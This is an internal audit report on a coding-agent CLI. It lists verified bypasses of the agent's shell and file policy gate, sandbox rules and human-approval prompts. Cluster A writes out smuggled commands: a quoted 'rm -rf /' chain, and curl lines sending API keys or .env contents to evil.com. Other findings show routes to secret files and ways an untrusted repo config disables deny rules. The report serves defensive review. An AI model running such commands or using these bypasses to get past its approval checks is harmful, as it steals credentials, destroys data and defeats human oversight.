# v2.0 UAT Re-Audit & Adversarial Gap Report

- **Date:** 2026-11-26
- **Audited Commit (`HEAD`):** `df42f18` (`fix(19.1): close search secret-read parity and curl config/write flag gaps`)
- **Scope:** All passed (and currently active) `v2.0` UATs across Phases 13–19 + Phase 19.1 (`13-UAT.md` Tests 1–4, `14-UAT.md` Tests 1–6, `15-UAT.md` Tests 1–6, `16-UAT.md` Tests 1–6, `17-UAT.md` Tests 1–6, `18-UAT.md` Tests 1–6, `19-UAT.md` Tests 1–6, `19.1-UAT.md` Test 1 `pass` + Test 2 `pending`).
- **Methodology:** Parallel source-and-probe audits across every phase cluster, deduplicated against `.planning/research/V1_V2_PARITY_AUDIT.md` (`TRACKED-19.2`, `TRACKED-20`, `TRACKED-23`), with high-risk bypasses and regressions independently executed against `HEAD` (`df42f18`).
- **Rule Invariant Status:** `git diff ee42ea2 -- strands_code_agent/` remains empty (`D-24`).

---

## Executive Summary

| Cluster | Phases Covered | New High | Drift / Regression | New Med | New Low | Probe Blind Spots |
|---|---|---|---|---|---|---|
| **A. Policy Gate & Scope Security** | Phase 19.1 (Tests 1–2) | 8 | — | 6 | 2 | 2 UAT test clusters |
| **B. Skills Marketplaces & Lockfile** | Phase 18 (Tests 1–6) | 4 | 1 | 4 | 4 | 5 blind spots |
| **C. Strands Box & Dogwood Policy** | Phase 19 (Tests 1–6) | 4 | 3 | 2 | 3 | 3 blind spots |
| **D. Decision Routing (`DecisionModel`)** | Phase 17 (Tests 1–6) | 3 | — | 2 | 2 | 4 blind spots |
| **E. Providers, Resume, `/btw`, `subagent` & `/cost`** | Phases 13–16 | 8 | 4 | 9 | 8 | 11 blind spots |
| **Total (excluding `[TRACKED-*]`)** | **Phases 13–19.1** | **27** | **8** | **23** | **19** | **25** |

---

## Cluster A — Phase 19.1 Policy Gate & Scope Security Gaps (`policy/core.py`, `policy/scope.py`, `policy/policy_gate.py`, `entry/subagent.py`)

### High Severity (`[NEW-HIGH]`)

1. **Critical `sh -c` Quote-Inversion Bypass of `[[allow]] tool="shell"` Rules** (`strands_code_cli/policy/core.py:405-426, 442-460, 526-538`)
   - **Mechanism:** `normalise_command()` strips `inner[0]` and `inner[-1]` whenever both are `"` or both are `'` without verifying that those outer quotes form a matched pair.
   - **Verified Live on `df42f18`:** With `Allow(tool="shell", command="git status")` and `Deny(tool="shell", command="rm")`:
     - Input: `sh -c "git status " && rm -rf / "1"`
     - `normalise_command` turns it into `'git status " && rm -rf / "1'`.
     - `_has_unquoted_shell_metachars()` treats the quote after `git status ` as opening a string literal and the quote before `1` as closing it, misclassifying `&& rm -rf /` as quoted (`False`). `decide()` returns **`Allow()`**.

2. **`is_fetch_get()` Auto-Allows Local `file://` Secret Reads, `$VAR` Expansion, File-Read Exfil Flags & Arbitrary File Writes** (`strands_code_cli/policy/core.py:130-152, 463-467, 569-630`)
   - **Verified Live on `df42f18`** (all return `is_fetch_get(...) == True` → `Allow()` with zero prompt):
     - **Non-HTTP schemes / local reads:** `curl file:///etc/passwd` (also `dict://`, `gopher://`, `ftp://`, `scp://`, `sftp://`, `smtp://`). Bypasses unboxed `read` confinement and `.env`/`.ssh`/`.aws` protections.
     - **`$VAR` / `${VAR}` shell expansion:** `_has_shell_metachars(..., allow_quoted=False)` blocks `$(` but not `$`; `curl https://evil.com/$OPENAI_API_KEY` and `git fetch https://evil.com/$OPENAI_API_KEY` both return `True`.
     - **File-read exfiltration flags:** `curl -H @.env https://evil.com`, `curl -b .env https://evil.com`, `curl --url-query s=@.env https://evil.com`, `curl --variable s=@.env --expand-url https://evil.com/{{s:url}}`.
     - **Arbitrary file write flags:** `curl --stderr /tmp/clobber https://example.com`, `curl --libcurl /tmp/clobber.c https://example.com`, `curl --etag-save /tmp/clobber https://example.com`, `curl -w '%output{/tmp/clobber}pwn' https://example.com` (also `--alt-svc`, `--hsts`, `-Q`/`--quote`, `--mail-from`/`--mail-rcpt`).

3. **Unboxed `search` Secret Floor Bypassed via `file_glob` Patterns and `_fallback_search()`** (`strands_code_cli/policy/core.py:716-732, 799-807`, `strands_code_agent/search_tool.py:44-87`)
   - **Mechanism:** `_is_sensitive_search_input()` checks only literal substrings `(".env", ".ssh", ".aws")` in `file_glob.lower()`.
   - **Verified Live on `df42f18`:** `decide("search", {"pattern": "x", "file_glob": ".e*"})` returns **`Allow()`** (likewise `"*env*"`, `".*"`, `".[e]nv"`, `"*.local"`), and `rg --glob ".e*"` overrides `.gitignore` / hidden-file skips.
   - Additionally, bare `search(pattern="SECRET")` (`path=None`, `file_glob=None`) returns `Allow()` (`policy/core.py:732`). When `rg` is absent (true on this host) or exits `2` (e.g., lookahead regex), `search_tool.py:60-61, 73` runs `_fallback_search()` (`target.rglob("*")` — no dotfile or `.gitignore` filtering), scanning `.env`, `.env.local`, and `.git/config` directly.

4. **Unexpanded `~` in `_match_path_rule()` Bypasses Explicit `[[deny]]` on `search`, `write`, and `edit`** (`strands_code_cli/policy/core.py:503` vs `strands_code_cli/policy/scope.py:29`)
   - **Mechanism:** `_match_path_rule()` does not call `os.path.expanduser(raw)` (turning `~/...` into `/cwd/~/...`), whereas `_decide_file_tool`, `_decide_read_or_search_tool`, `diff_gate`, and `search_tool` call `scope.resolve()` which expands `~`.
   - **Verified Live on `df42f18`:** `[[deny]] tool="search" path="<home>/tmp_verify_tilde_test/README.md"` + `search(path="~/tmp_verify_tilde_test/README.md")` misses `deny` and returns **`Allow()`** (`write`/`edit` under `allow *` do likewise).

5. **Relative Allow Globs (`*.txt`, `*`) Match Arbitrary Outside-Root Absolute Paths via `real_abs`** (`strands_code_cli/policy/core.py:508-523, 840-859, 882-886`)
   - **Mechanism:** `_match_path_rule()` includes `real_abs` in `candidates` even for relative globs, and `fnmatch` lets `*` cross `/`.
   - **Verified Live on `df42f18`:** `[[allow]] tool="read" path="*.txt"` → `decide("read", {"path": "/etc/hosts.txt"})` returns **`Allow()`** (`Rule("*","*")` allows `/etc/passwd` & `search /etc`; `Rule("write", "*.txt")` allows `/tmp/outside.txt` and passes `confine()`).

6. **`write` / `edit` Omit `~/.ssh/` and `~/.aws/` from Protected Paths** (`strands_code_cli/policy/core.py:810-837` vs `:780-796`)
   - **Verified Live on `df42f18`:** `decide("write", {"path": "~/.ssh/authorized_keys"}, policy=PolicyConfig(allow=[Rule("*", path="*")]))` returns **`Allow()`** (symmetric protection exists on `read`/`search`, not `write`/`edit`, and HITL does not disable `"Always"` or `trust_delegated` on `~/.ssh/*` or `~/.aws/*`).

7. **Malformed or Symlinked Untrusted Repo `./.agent/policy.toml` Silently Wipes All User Home `[[deny]]` Rules** (`strands_code_cli/policy/core.py:220-229`, `strands_code_cli/policy/policy_gate.py:513-518`)
   - **Verified Live on `df42f18`:** A 1-byte syntax error in `repo.toml` caused `PolicyConfig.load(home_path=home_p, repo_path=repo_p)` to drop `home.toml`'s `[[deny]] tool="shell" command="rm"` rule (`len(loaded.deny) == 0`). A symlinked repo `.agent/policy.toml` raises `ValueError` caught by `_current_policy()`, likewise erasing all home `[[deny]]` rules and auto-allowing `read`/`search`/`curl GET`/`skills`/etc.

8. **`ApprovalBroker` Uncaught `EOFError`/`RuntimeError` in `run_prompt()` & Pump-Teardown Enqueue Race** (`strands_code_cli/policy/policy_gate.py:191-196, 228-272, 566`, `strands_code_cli/loop/pump.py:259, 457`, `strands_code_cli/loop/core.py:783`)
   - `_ApprovalRequest.run_prompt()` invokes `input()`/`radio_choice()` on the main pump thread with no `except Exception:` guard, so `EOFError` or TTY `RuntimeError` escapes `_pump_parallel` (`except KeyboardInterrupt` only) and crashes the turn instead of failing closed to `InterventionDeny`.
   - `ApprovalBroker.request()` checks `self._pumping.is_set()` without holding a lock against `pump()` exit (`:238-242`), allowing a request to enqueue after pump drain and block until cancel.

### Medium & Low Severity (`[NEW-MED]`, `[NEW-LOW]`)

- `[NEW-MED]` **`PolicyGateHandler._state_lock` non-reentrant `Lock` GC deadlock risk (`policy_gate.py:368, 391-408`):** `weakref.finalize` runs `_cleanup_agent_id` synchronously on whichever thread triggers GC; collecting a dead `/btw`/`subagent` while holding `_state_lock` deadlocks, and `_cleanup_agent_id` pops `agent_id` without checking finalizer identity against `self._finalizers.get(agent_id)`.
- `[NEW-MED]` **Read-only `/btw` spawning `subagent` escalates to writable (`entry/subagent.py:134-140, 187`, `loop/btw.py:486-487`):** `build_cli_subagent(parent_holder, kwargs)` reads `is_ro(parent_holder["agent"])` (`main`) instead of the invoking agent (`btw`).
- `[NEW-MED]` **`_toml_rule_str()` non-BMP surrogate crash & `_derive_rule()` gaps (`policy/core.py:278, 383-386`, `policy_gate.py:294-312, 596-598`):** `json.dumps` (`ensure_ascii=True`) breaks `tomllib.loads` on emoji paths/commands; `\r` breaks persistence; `_derive_rule` returns `None` for `search(path=None, file_glob=".env*")`, `TOOL_ONLY_TOOLS` (`subagent`), and fails to expand `~`.
- `[NEW-MED]` **`effective_roots` widens `/tmp*` to `/` (`policy/scope.py:61-75, 105-113`):** **Verified live:** `Rule("write", path="/tmp*")` adds `'/'` to `effective_roots(['/tmp/repo', '/tmp', '/'])`.
- `[NEW-MED]` **ANSI/OSC escape injection in HITL prompts (`policy_gate.py:527, 536-540`):** `Syntax(code, "python")` and raw `Risk: {verdict.reason}` omit `sanitize_line()`, allowing CSI/OSC sequences into terminal previews and under `NO_COLOR=1`.
- `[NEW-LOW]` `python_repl` bare `norm.startswith(prefix)` allow matching (`policy/core.py:530-531`) and unlocked `append_rule()` RMW (`:272-286`).

---

## Cluster B — Phase 18 Skills Marketplaces & Lockfile Gaps (`memory/marketplace.py`, `memory/skills.py`, `dispatch/core.py`, `entry/main.py`)

### High Severity (`[NEW-HIGH]`)

1. **Off-by-One `.parent` Bug in `_atomic_swap_skill_dir()` Enables Arbitrary Directory Overwrite/Deletion via Symlinked `<ns>`** (`strands_code_cli/memory/marketplace.py:1540-1568, 1591`)
   - **Verified Source on `df42f18`:** `dest_dir` is `<cwd>/.agent/skills-marketplaces/<ns>/<skill>` (4 levels deep), yet line `1541` sets `root = dest_dir.parent.parent.parent` (**3** `.parent` hops = `<cwd>/.agent`), then calls `_refuse_symlink_chain(root, ".agent", "skills-marketplaces", dest_dir.parent.name, dest_dir.name)`. That probes non-existent `<cwd>/.agent/.agent/...` and skips `<ns>` and `<skill>` completely, while `_install_catalog_skill` (`:1591`) only checks up to `skills-marketplaces`. Audited live by Phase 18 subagent: symlink `<cwd>/.agent/skills-marketplaces/acme -> /tmp/victim` caused `_atomic_swap_skill_dir` to delete `/tmp/victim/audit/important.txt`.

2. **`update_installed_skills()` Bypasses `_validate_sync_source()`** (`strands_code_cli/memory/marketplace.py:1604-1612, 1764-1791, 1805-1868` vs `:1870-1885, 1916`)
   - **Verified on `df42f18`:** `_validate_sync_source` is absent from `update_installed_skills` and `_refresh_entry_from_sources` (`P18_UPDATE_CALLS_VALIDATE: False`). In a repo whose `./.agent/skills-lock.json` contains an unregistered namespace or skill with `repo_url` pointing to an arbitrary local host directory, `update_installed_skills()` copies that local directory into `./.agent/skills-marketplaces/`.

3. **Tarball Decompression Bomb & Unbounded Catalog Extraction** (`strands_code_cli/memory/marketplace.py:707-729, 1332-1369`)
   - `_validate_tarball_stream` (`:710-713`) opens `mode="r:*"` and calls `tf.getmembers()` with zero decompressed-byte limit or member-count cap; `discover_catalog_from_tarball` (`:1346-1359`) caps `MAX_SKILL_BYTES` per individual `SKILL.md` only, with zero cumulative byte or file-count cap.

4. **Intermediate-Component Symlink Escape in Local Marketplace Discovery & Copy** (`strands_code_cli/memory/marketplace.py:835, 1067-1073, 1294-1298, 1605-1612`)
   - `_expand_plugin_subpath`, `discover_catalog_from_tree`, and `copy_local_dir_safe` check `.is_symlink()` on the leaf path only, following intermediate symlink directories (`escape/target` or `.agent-plugin -> /outside`) without root containment assertions.

### Drift, Medium & Low Severity (`[DRIFT]`, `[NEW-MED]`, `[NEW-LOW]`)

- `[DRIFT]` **Phase 18 Test 5 (`18-UAT.md:53-60`) targeted deleted `PolicyHumanInTheLoop`:** Replaced by `PolicyGateHandler` in Phase 19.1 (`42e72e9`). Protected-path `Prompt` downgrades are preserved & expanded (`policy/core.py:810-859`), while `PolicyGateHandler` `Risk:` line is unsanitized (`policy_gate.py:540`).
- `[NEW-MED]` **Terminal ANSI/OSC escape injection (`marketplace.py:634-645, 1658-1662`, `dispatch/core.py:2140-2142, 2189-2205`):** `_normalize_rel_posix` allows ESC/C0/C1 control bytes in tarball filenames; `_scripts_warning`, `/skills update`, and `/skills show` print raw filenames, `entry.allowed_tools`, and `entry.source_url` without `sanitize_display`.
- `[NEW-MED]` **Non-atomic rollback gap between `_atomic_swap_skill_dir` and `save_lockfile` (`marketplace.py:1566-1568, 1637-1654`):** Backup is deleted in `_atomic_swap_skill_dir`'s `finally:` before `save_lockfile` runs, stranding v2 on disk pinned to v1 hash if `save_lockfile` fails.
- `[NEW-MED]` **API/JSON bounds & crashers (`marketplace.py:422-428, 505-516, 935, 945, 1298`):** `_github_get_json` uses non-streaming `client.get()` buffering full bodies before `MAX_API_JSON_BYTES`; `load_cached_catalog` raises `TypeError` on `{"skills": null}`; local JSON loaders (`load_lockfile`, `load_cached_catalog`, `discover_catalog_from_tree`) omit `parse_constant=_reject_json_constant`.
- `[NEW-MED]` **`discover_plugin_sources` / `AgentSkills` gaps (`memory/skills.py:95-107, 250-256`, `entry/main.py:201-203`, `strands/vended_plugins/skills/agent_skills.py:333-335, 388`):** Returns `str(local_root)` without symlink check during `build_agent` startup (before `SkillIndex()` checks symlinks); `SkillIndex.reload()` never re-checks local symlinks; ambiguous marketplace bare names silently overwrite in `AgentSkills`; model activation via pre-allowed `skills` tool omits `@ <short_sha>` / untrusted provenance framing.
- `[NEW-LOW]` Case-sensitive `== ".gitmodules"` lets `.GITMODULES` pass (`marketplace.py:655, 767, 855`); `compute_skill_dir_hash` ignores empty dirs & file permissions (`+x`) and uses unbounded `read_bytes()` (`:878-905`); `sync_installed_skills` skips ancestor symlink check when hash matches (`:1907-1915`); `_skills_remove_cmd` probes `(marketplaces_dir / ns / sname).is_symlink()` before validating `ns`/`sname` and swallows `_skills_reload` errors (`dispatch/core.py:2218-2230`).

---

## Cluster C — Phase 19 Strands Box & Dogwood Policy Gaps (`sandbox/box.py`, `policy/codeact.py`, `dispatch/core.py`)

### High Severity (`[NEW-HIGH]`)

1. **`render_policy_dw()` Emits Zero `permit` Rules for `shell:exec` or `fs:*`, Plus `.venv` `pytest` Deadlock** (`strands_code_cli/sandbox/box.py:408-413, 441, 960-1028`, `strands_code_cli/policy/codeact.py:235-242`)
   - **Verified Source on `df42f18`:** Under `strands-box 0.3.1` default-deny (`shell:exec` for hosted Shell builtins `ls`/`cat`/`grep`/`echo`/`printf`/`cd`, `shell:spawn` for `[tool.<name>]`, plus `fs:read`/`fs:write`/`fs:delete`/`fs:move`), `render_policy_dw()` (`:960-1028`) ONLY permits `shell:spawn` (`allow_dev_tools`), `net:connect`, and `http:request` — **zero** `permit` rules for `shell:exec` or `fs:*`, breaking hosted-shell commands (including `codeact_shell` under `STRANDS_BOX=1`) and making the 4 `fs:*` `forbid` rules dead until `fs:*` is permitted.
   - Additionally, `_first_non_writable_tool()` (`:408-413`) skips `.venv/bin/pytest` (inside writable `ws`) and returns `None` without PATH fallback, so `[tool.pytest]` is never emitted in `box.toml` for `.venv` repos — deadlocking `push_requires_recent_tests` (`uv run pytest` records `input.program == "uv"`, not `"pytest"`). `allow_dev_tools` also includes `"python"` when `[tool.python]` is omitted under `monty=true` (`:441, 1002`).

2. **`[DRIFT]` Box Anthropic Egress Uses `x-api-key`, While Locked `anthropic==2.13.0` Sends `Authorization: Bearer`** (`strands_code_cli/sandbox/box.py:623-630`)
   - **Verified Live on `df42f18`:** `anthropic.AsyncAnthropic(api_key="test-key")._api_key_auth` returns `{'Authorization': 'Bearer test-key'}`, whereas `_egress_specs_for_providers(["anthropic"], ...)` configures `header='x-api-key', prefix=''` — leaving the sandbox phantom token in `Authorization: Bearer` intact on requests to `api.anthropic.com`.

3. **`push_requires_recent_tests` MFOTL Bypasses & False Positives** (`strands_code_cli/sandbox/box.py:1002, 1005-1023`)
   - `git -c alias.p=push p` bypasses `arg1`/`arg2`/`* push`/`* push *` (`:1010-1013`).
   - Permitted `uv` (`allow_dev_tools:1002`) spawns `shell:spawn` with `program == "uv"`, allowing `uv run git push` to bypass both `program == "git"` and `fs:read` checks.
   - `pytest --version` exits `0` (`output.status: 0`), opening the 900s push window without running tests.
   - `command like "* push *"` false-positives on benign `git commit -m "fix push bug"`.

4. **Omitting `XDG_CONFIG_HOME` / `XDG_CACHE_HOME` from `[agent.env]` Hides Host `~/.config/strands-code/` & Weakens Boxed Protected Paths** (`strands_code_cli/sandbox/box.py:489-509, 588-592, 782-805`, `strands_code_cli/policy/core.py:818-824`)
   - When host `XDG_CONFIG_HOME`/`XDG_CACHE_HOME` are unset, `box.py:791-802` omits them while omitting `HOME`. Inside the box, `platformdirs.user_config_dir("strands-code")` resolves under synthetic `$BOX_HOME/.config/strands-code` instead of the writable host bind mount `~/.config/strands-code` — hiding `config.yaml`, home `policy.toml` (`[[deny]]` rules), `routing.yaml`, and `marketplaces.yaml`, and placing the writable host `~/.config/strands-code` mount outside `_is_protected_skills_or_config_path()`.

### Drift, Medium & Low Severity (`[DRIFT]`, `[NEW-MED]`, `[NEW-LOW]`)

- `[DRIFT]` **Stale `/policy` builtin line (`dispatch/core.py:2327`):** Still prints `"Builtins: allow read, search; allow GET-shaped fetch, git fetch."`, omitting the 4 new `BUILTIN_ALLOWED_TOOLS` and unboxed `read`/`search` prompt behavior.
- `[DRIFT]` **Uneven symlink-ancestor depth across `box init` / `box run` / `box doctor` (`sandbox/box.py:1153, 1280, 1415`):** `box init` checks 2 ancestors from dir, `box run` 2 ancestors from file (missing `strands-box/`), `box doctor` checks 1 level manually (missing `repos/`, `strands-box/`, and custom `policy = ...`).
- `[NEW-MED]` **`_toml_str()` uses `ensure_ascii=True` (`box.py:141-143`) — Verified Live on `df42f18`:** `bx._toml_str("🚀")` returns `'"\\ud83d\\ude80"'` → `tomllib.TOMLDecodeError: Escaped character is not a Unicode scalar value`, crashing `box init` on non-BMP paths.
- `[NEW-MED]` **`_check_apparmor()` unguarded `read_text()` & existence-only profile check (`box.py:1251-1276`).**
- `[NEW-LOW]` `_providers_from_env()` omits `LITELLM_API_KEY` (`box.py:298`); `forbid_sensitive_files_read` omits `*/.git/config`, `*/.netrc`, `*/.npmrc`, `*/.pypirc` (`box.py:972-976`); single-ref pinning falls back to primary var (`GOOGLE_API_KEY`/`MODEL_API_KEY`/`GITHUB_TOKEN`) if `--provider` is passed before exporting alias env vars (`:687-748`).

---

## Cluster D — Phase 17 Decision Routing Convergence (`routing/transports.py`, `routing/core.py`)

### High Severity (`[NEW-HIGH]`)

1. **Unlisted `probabilities` Keys Crash `decide()` (`StopIteration`) & Defeat Sum-to-1 Tolerance** (`strands_code_cli/routing/transports.py:455-506`, `strands_code_cli/routing/core.py:1367-1416, 1455-1469, 1933-1935, 1984, 2064`)
   - **Verified Live on `df42f18`:**
     - `rc.validate_choice_answer({"type": "choice", "choice": "m1", "probabilities": {"m1": 0.1, "evil/model": 0.9}}, cands)` passes (`evil/model` is not rejected), causing `gate_model` to pick argmax `"evil/model"` and `_find_candidate` to raise unhandled `StopIteration` outside `_run_chain`'s `try/except`.
     - Because `tol = 1e-6 + len(probs) * 5e-5`, an unconstrained `probs` dict with 20,000 `0.0` keys passes `rc._validate_choice_shape(...)` (`sum == 0.0`, `tol == 1.000051`).

2. **`ollama_headers()` Attaches `OLLAMA_API_KEY` Over Cleartext HTTP, Misses `0.0.0.0`/`127.1` Loopback, & Leaks Key to Repo `routing.yaml`** (`strands_code_cli/routing/transports.py:116-132, 171-200`, `strands_code_cli/routing/core.py:359-368, 469-472, 1321`)
   - **Verified Live on `df42f18`:**
     - `rt.ollama_headers("http://remote.example:11434")` attaches `'Authorization': 'Bearer secret-ollama-token'` over cleartext `http://`.
     - `rt.ollama_headers("http://0.0.0.0:11434")` also attaches the bearer token (same for `[::]`, `127.1`, `2130706433`).
     - Untrusted repo `./.agent/routing.yaml` wins whole-file (`routing/core.py:469-472`), so an arbitrary `engine.local_base_url` exfiltrates `OLLAMA_API_KEY` on preflight `GET /api/version`.

3. **`run_llm_decision()` Retry Crashes `AnthropicModel` With `RuntimeError('Event loop is closed')`** (`strands_code_cli/routing/transports.py:980-1002`)
   - `resolve_harness_model(...)` runs once outside `_invoke()`, before `run_decision_sync(_invoke, retry=True)`. `AnthropicModel` (`anthropic/*` and `bedrock/anthropic.claude-*`) holds one persistent `AsyncAnthropic`/`AsyncAnthropicBedrock` client bound to loop 1's keep-alive pool, crashing attempt 2 on loop 2 after HTTP 429.

### Medium & Low Severity (`[NEW-MED]`, `[NEW-LOW]`)

- `[NEW-MED]` **64 KiB body fit UTF-8 & cap bugs (`transports.py:318-336, 374-430`, `routing/core.py:1107-1138`):** Subtracting byte excess from Unicode character count over-truncates emoji/CJK asks, non-`ask` overflow still yields `>64 KiB` payloads, and `candidate.criteria`/`note`/`tier` have zero length cap.
- `[NEW-MED]` **`run_llm_decision()` omits `config.yaml` `base_url` & `api_mode` (`transports.py:981-987`).**
- `[NEW-LOW]` Negative `_cost(-5.0)` accepted (`transports.py:212-217`); unguarded `result.answers[q_id]` (`:741`).

---

## Cluster E — Phases 13–16 Providers, Resume, Model Switching, `/btw`, `subagent` & `/cost`

### High Severity (`[NEW-HIGH]` / `[DRIFT]`)

1. **`[DRIFT]` `[NEW-HIGH]` `model_id_of()` Returns Bare Unprefixed IDs for Gemini, OpenAI & Anthropic — Breaking Phase 19.1 `/btw` Billing, Usage Math, `/route` Fast-Path & `subagent`/`btw` Guards** (`strands_code_cli/model/model_switch.py:1059-1076, 1594-1599`, `loop/core.py:332-337, 469, 690, 926, 2204`, `cost/cost_context.py:148-153`, `loop/btw.py:518-528`, `entry/subagent.py:144-154`)
   - **Verified Live on `df42f18`:** `model_id_of(GeminiModel(model_id="gemini-3.8-flash"), "") == "gemini-3.8-flash"`, `model_id_of(OpenAIResponsesModel(model_id="gpt-6.2-sol"), "") == "gpt-6.2-sol"`, `model_id_of(AnthropicModel(model_id="claude-sonnet-5-5"), "") == "claude-sonnet-5-5"`.
   - Because `_is_bedrock_model("gemini-3.8-flash") == True`, `_is_bedrock_model("gpt-6.2-sol") == True`, and `_is_exclusive_usage_provider(...) == True`:
     - Phase 19.1 `/btw` turns record bare IDs in `session_turns`, re-triggering AWS Bedrock Price List/boto3 calls on zero-AWS sessions (`T-14-09` regression) and misclassifying OpenAI/Gemini tokens as exclusive when `totalTokens == 0`.
     - `_btw_context_for` passes bare `current_model` into `_route_side_spawn`, breaking the same-model no-op fast path.
     - `build_btw_agent` and `_configure_child_agent` treat bare `"gpt-4o"` as `"bedrock"`, disabling `configure_openai_for_model` and `scoped_base_url`.

2. **`prepare_resumed_history()` Three Resume Bugs (Anthropic, Gemini & Cross-Provider Bedrock)** (`strands_code_cli/model/model_switch.py:1383-1458`)
   - **Verified Live on `df42f18`:**
     - **Same-model Anthropic/Gemini resume (`prepare_resumed_history(ag1, "anthropic/claude-sonnet-5-5", RichHistory())`):** emits `UserWarning: Dropping reasoningContent`, converts signed `reasoningContent` (`['text']`) and strips `toolUse["reasoningSignature"]`, and writes `rich.model_id = "__resumed__"` so traces can never be restored.
     - **Plain non-Bedrock thinking resumed onto Bedrock (`prepare_resumed_history(ag2, "bedrock/us.anthropic.claude-sonnet-4-6", RichHistory())`):** returns `False`, leaving raw direct Anthropic/Gemini `reasoningContent` unconverted (`still_has_reasoning= True`), causing Bedrock `ValidationException`.
     - **Stale `rich.model_id`:** when `rich.model_id` holds an earlier Bedrock ID before away-turns added Gemini signatures, `convert_history(source, "bedrock/...", "bedrock/...")` is a no-op and leaves foreign signatures unstripped.

3. **`apply_model_action()` Multi-Hop Switch-Back Leaks Foreign Thinking from Away-Model Tail** (`strands_code_cli/loop/core.py:1250-1278`)
   - Splices `rich.messages + source[rich.length:]` and converts the entire list with `convert_from = rich.model_id`, keeping away-model signed thinking (`Gemini → OpenAI → Bedrock Claude → Gemini` or `Bedrock → Gemini → Bedrock`), crashing `GeminiModel`/`BedrockModel`.

4. **Bedrock → `anthropic/*` Switch Emits Duplicate `"web_search"` Tool Names (HTTP 400); Bedrock → `openai/*`/`meta/*` Leaks Dual Search Tools** (`strands_code_cli/model/model_switch.py:1582-1591, 1651-1658`, `strands_harness/agent.py:96, 467`)
   - AgentCore's function tool `"web_search"` stays registered on `agent.tool_registry` when `resolve_harness_model(..., web_search=True)` adds native `"web_search"` (`web_search_20260318`), producing two `"web_search"` definitions in Anthropic's payload (`HTTP 400: Tool names must be unique`).

5. **`fork_btw_history()` & `subagent._fork_messages` Leak `toolUse["reasoningSignature"]`** (`strands_code_cli/loop/btw.py:179-196`, `strands_code_cli/entry/subagent.py:191-202`)
   - Parent Gemini `toolUse["reasoningSignature"]` survives fork into OpenRouter/`LiteLLMModel` delegates, corrupting `tool_calls[].id` (`"c1__thought__..."` mismatch with `toolResult`).

6. **`[DRIFT]` `entry/subagent.py` Crashes on `spec.model="meta/..."` and Drops `api_mode="chat"`** (`strands_code_cli/entry/subagent.py:102-110, 179, 200`)
   - Passes `"meta/..."` verbatim to `create_harness` (`ValueError: Unknown model provider 'meta'`) and pops `_api_mode` unconditionally.

7. **Concurrent `/btw` and `subagent` Share Non-Thread-Safe `AnthropicModel` (`AsyncAnthropic`)** (`strands_code_cli/cost/reported_cost.py:113-122`, `loop/btw.py:491`, `entry/subagent.py:105`, `strands/models/anthropic.py:315-316`)
   - `fresh_side_model()` returns the same `AnthropicModel` holding a single `AsyncAnthropic` HTTP connection pool without thread locking across concurrent `/btw` and background `subagent` event loops.

8. **Vertex AI `/model` Discovery Drops 100% of Live Models** (`strands_code_cli/model/model_switch.py:573-611`)
   - **Verified Live on `df42f18`:** `ms._is_google_chat_model(SimpleNamespace(name="publishers/google/models/gemini-2.5-flash", supported_actions=["generateContent"]))` returns `None` because only `"models/"` (not `"publishers/google/models/"`) is stripped.

### Other Regressions, Medium & Low Severity

- `[DRIFT]` **OpenRouter Llama `supports_media` regressed to `True`** (`model_switch.py:53-70`, commit `0f6c325`, verified live: `ms.supports_media("litellm/openrouter/meta-llama/llama-3.3-70b-instruct") == True`, contradicting `16-UAT.md:49` & `docs/QUICKSTART.md:216`).
- `[DRIFT]` **`supports_reasoning("openai/"|"meta/")` flipped to `True` in `0f6c325`:** causes same-provider switches (`openai/A -> openai/B`, `meta/A -> meta/B`) after streamed unsigned reasoning to warn `Dropping reasoningContent` (`model_switch.py:177-189, 361-373`).
- `[DRIFT]` **`build_btw_agent()` missing `isinstance(..., Model)` guard for `caching=False` (`loop/btw.py:488-493`) & `_route_side_spawn()` passing both `model=Model` + `effort=...` (`loop/core.py:614-615`):** logs harness warnings on OpenAI/Anthropic `/btw`.
- `[DRIFT]` **Phase 13 `u3` docstrings/comments (`scenarios_upstream.py:6, 264`, `scripts/uattest/README.md:41`):** reference removed `PolicyHumanInTheLoop` and old `DENIED: DENY:...` wire string (`policy_gate.py:524-529` now sends `DENIED: Denied by policy rule ...`).
- `[DRIFT]` Minor doc drift: `docs/QUICKSTART.md:89` names `OPENAI_PROJECT` instead of `OPENAI_PROJECT_ID`; ambient OpenAI default bumped from `gpt-6.1-sol` to `gpt-6.2-sol`.
- `[NEW-MED]` `--model <arn>` / ARN in `config.yaml` crashes `create_harness` (`entry/main.py:113-153, 344, 374`); `GOOGLE_GENAI_USE_VERTEXAI=yes`/whitespace & `GOOGLE_GENAI_USE_ENTERPRISE` mismatch (`entry/first_run.py:25, 57-87`); `estimate_messages_tokens` counts all historical `InjectedBlock`s (`cost_context.py:805-809`); `openai/gpt-4-0613` bypasses `_is_openai_non_reasoning` (verified live: `False`) & `effort="max"` clamp unreachable (`model_switch.py:684, 1195-1217`); Meta `web_fetch`/`MemoryManager` reuses `effort="high"`+`web_search`+`CacheConfig()` model & `api_mode="chat"`+`base_url` skips `_build_web_fetch_model` (`entry/main.py:244-251`); Bedrock Converse `BedrockModel` cache usage bug (`_extract_prompt_usage` → `20000% cached`) & offline `_default_cache_rates` (`1.0x` vs `1.25x` write, `0.10x` vs `0.05x`); discovery & `api_mode="chat"` ignoring `ProviderConfig.base_url` / `OPENAI_BASE_URL`; `scrub_credentials()` missing `x-api-key:`/`x-goog-api-key:` (verified live: unredacted).
- `[NEW-LOW]` Case-sensitive `_vendor_of`/`_base_key` bypassing `_NO_STREAMING_TOOLS`; false `"Bedrock unary tool mode"` note on non-Bedrock overrides; `google/models/gemini-2.5-*` guard miss; `disable_cwd_dotenv()` missing `dotenv_values()`; `window_for` omitting `model=` at 3 sites; unbounded Gemini `Pager`; `NaN` `fetched_at` in `anthropic-models.json`; DEL char in `_validate_base_url`.

---

## Key Cross-Phase UAT Probe Blind Spots (`[PROBE]`)

- **Phases 13–14:** `u3` Part C never asserts Plan-mode denial text; `u2` never verifies `InjectedBlock` token counts or non-Bedrock/cross-provider resume; `u1`/`g1`/`o1`/`an1`/`m1` never run a turn *after* switching `/model` to the secondary model; `g1`/`o1`/`an1`/`m1` strip 5 `AWS_*` vars only (leaving `HOME` `~/.aws` intact); Phase 14 Tests 1/3/4 helper scripts (`run_uat_test*.py`) are not checked into `scripts/uattest/`; `m1` Turn 1 logged `0` cached tokens; unit mocks like `_ReplayModel("openai/gpt-5")` masked bare `model_id_of()`.
